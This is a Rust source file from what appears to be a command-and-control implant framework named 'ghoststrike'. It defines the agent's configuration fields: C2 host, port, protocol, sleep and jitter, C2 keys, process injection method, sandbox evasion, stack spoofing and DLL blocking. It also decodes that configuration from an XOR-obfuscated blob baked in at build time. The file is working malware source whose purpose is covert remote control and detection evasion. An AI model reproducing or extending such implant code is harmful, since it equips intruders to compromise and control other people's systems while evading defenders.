//! Embedded, encrypted agent configuration.
//!
//! The builder bakes a unique XOR-encrypted blob into this module at compile time.
//! At runtime we decrypt it and deserialise.

use ghoststrike_common::{xor_decode, ListenerProtocol, SleepObfuscation, InjectionMethod};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub c2_host:    String,
    pub c2_port:    u16,
    pub protocol:   ListenerProtocol,
    pub sleep_ms:   u64,
    pub jitter_pct: u8,
    pub dns_domain: Option<String>,
    pub pipe_name:  Option<String>,
    pub build_id:   String,
    #[serde(default)]
    pub c2_key:     String,
    #[serde(default)]
    pub server_pubkey: String,
    // ── Evasion ──────────────────────────────────────────────────────────────
    #[serde(default)]
    pub sleep_obf:       SleepObfuscation,
    #[serde(default)]
    pub injection:       InjectionMethod,
    #[serde(default)]
    pub sandbox_evasion: bool,
    #[serde(default)]
    pub stack_spoof:     bool,
    #[serde(default)]
    pub block_dlls:      bool,
}

// ── Embedded config ───────────────────────────────────────────────────────────
// The builder replaces these two constants.  The XOR key is 32 random bytes;
// the blob is the JSON-serialised AgentConfig XOR-encoded with that key.

/// XOR key injected at build time.
const XOR_KEY:  &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/agent_key.bin"));
/// Encrypted config blob injected at build time.
const CFG_BLOB: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/agent_cfg.bin"));

pub fn load_embedded_config() -> AgentConfig {
    let plain = xor_decode(CFG_BLOB, XOR_KEY);
    serde_json::from_slice(&plain).expect("embedded config corrupt")
}
